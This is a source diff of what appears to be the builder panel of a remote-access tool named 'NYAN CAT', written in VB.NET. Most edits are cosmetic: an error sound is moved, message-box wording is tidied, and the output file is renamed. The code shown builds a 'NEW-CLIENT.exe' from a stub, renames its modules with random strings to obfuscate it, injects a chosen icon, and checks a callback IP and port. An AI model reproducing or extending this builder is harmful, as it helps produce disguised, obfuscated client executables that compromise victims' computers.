@@ -1,5 +1,5 @@
 ﻿'##################################################################
-'##         N Y A N   C A T  |||   Updated on Aug/18/2018        ##
+'##         N Y A N   C A T  |||   Updated on Aug/19/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -812,6 +812,9 @@ Public Class Main
 
     Public Sub Messages(ByVal user As String, ByVal msg As String)
         L2.Items.Add("[" + DateAndTime.Now.ToString("hh:mm:ss tt") + "]" + "  " + user + "  →  " + msg.ToString)
+        If msg.ToString.Contains("Error!") Then
+            Try : My.Computer.Audio.Play(My.Resources._Error, AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/
+        End If
     End Sub
 
     Private Sub ListBox1_DrawItem(sender As System.Object, e As DrawItemEventArgs) Handles L2.DrawItem
@@ -829,10 +832,10 @@ Public Class Main
 
             ElseIf L2.Items(e.Index).ToString.Contains("Error!") Then
                 e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Brushes.Red, New PointF(e.Bounds.X, e.Bounds.Y))
-                Try : My.Computer.Audio.Play(My.Resources._Error, AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/
 
             ElseIf L2.Items(e.Index).ToString.Contains("Established!") Then
                 e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, Brushes.LightSteelBlue, New PointF(e.Bounds.X, e.Bounds.Y))
+
             Else
                 e.Graphics.DrawString(L2.Items(e.Index).ToString(), e.Font, W, New PointF(e.Bounds.X, e.Bounds.Y))
             End If
@@ -1430,7 +1433,7 @@ Public Class Main
                         process.Start()
                         process.WaitForExit()
                     Else
-                        MsgBox("Framework 2.0 is not installed!", MsgBoxStyle.Critical, Nothing)
+                        MsgBox("Framework 2.0 is not installed!", MsgBoxStyle.Critical)
                         Return
                     End If
                 Else
@@ -1444,7 +1447,7 @@ Public Class Main
                         process.Start()
                         process.WaitForExit()
                     Else
-                        MsgBox("Framework 4.0 is not installed!", MsgBoxStyle.Critical, Nothing)
+                        MsgBox("Framework 4.0 is not installed!", MsgBoxStyle.Critical)
                         Return
                     End If
                 End If
@@ -1483,7 +1486,6 @@ Public Class Main
                     Dim definition2 As ModuleDefinition
                     For Each definition2 In definition.Modules
                         If chkRename.Checked Then
-                            definition2.Mvid = Guid.NewGuid
                             definition2.CustomAttributes.Clear()
                             definition2.Name = Randomi(rand.Next(5, 15))
                         End If
@@ -1570,12 +1572,12 @@ Public Class Main
                         Next
                     Next
 
-                    definition.Write(Application.StartupPath + "\" + "NEW CLIENT.exe")
-                        If _icon.Checked = True AndAlso PictureBox1.ImageLocation <> "" Then
-                            S_IconChanger.InjectIcon(Application.StartupPath + "\" + "NEW CLIENT.exe", PictureBox1.ImageLocation)
-                        End If
-                        MsgBox("Your Client Has been Created Successfully", vbInformation, "DONE!")
-                        My.Settings.Save()
+                    definition.Write(Application.StartupPath + "\" + "NEW-CLIENT.exe")
+                    If _icon.Checked = True AndAlso PictureBox1.ImageLocation <> "" Then
+                        S_IconChanger.InjectIcon(Application.StartupPath + "\" + "NEW-CLIENT.exe", PictureBox1.ImageLocation)
+                    End If
+                    MsgBox("Your Client Has been Created Successfully", MsgBoxStyle.Information, "DONE!")
+                    My.Settings.Save()
                         definition.Dispose()
                         Try : IO.File.Delete(Application.StartupPath & "\Misc\Stub\Stub.exe") : Catch : End Try
                     End If
@@ -1614,11 +1616,11 @@ Public Class Main
                 If x.Split(":")(0) = GetExternalAddress() AndAlso x.Split(":")(1) = S_Settings.PORT Then
                     MsgBox("Valid! " + x, MsgBoxStyle.Information)
                 ElseIf x.Split(":")(0) = GetExternalAddress() AndAlso x.Split(":")(1) <> S_Settings.PORT Then
-                    MsgBox("Valid! " + x + Environment.NewLine + "But port doesn't match your current port", MsgBoxStyle.Information)
+                    MsgBox(x + Environment.NewLine + "port doesn't match your current port", MsgBoxStyle.Exclamation)
                 ElseIf x.Split(":")(0) <> GetExternalAddress() AndAlso x.Split(":")(1) = S_Settings.PORT Then
-                    MsgBox("Valid! " + x + Environment.NewLine + "But IP doesn't match your current IP", MsgBoxStyle.Information)
+                    MsgBox(x + Environment.NewLine + "IP doesn't match your current IP", MsgBoxStyle.Exclamation)
                 ElseIf x.Split(":")(0) <> GetExternalAddress() AndAlso x.Split(":")(1) <> S_Settings.PORT Then
-                    MsgBox("Valid! " + x + Environment.NewLine + "But IP and port doesn't match your current settings", MsgBoxStyle.Information)
+                    MsgBox(x + Environment.NewLine + "IP and port doesn't match your current settings", MsgBoxStyle.Critical)
                 End If
             Else
                 MsgBox("Wrong format", MsgBoxStyle.Critical)
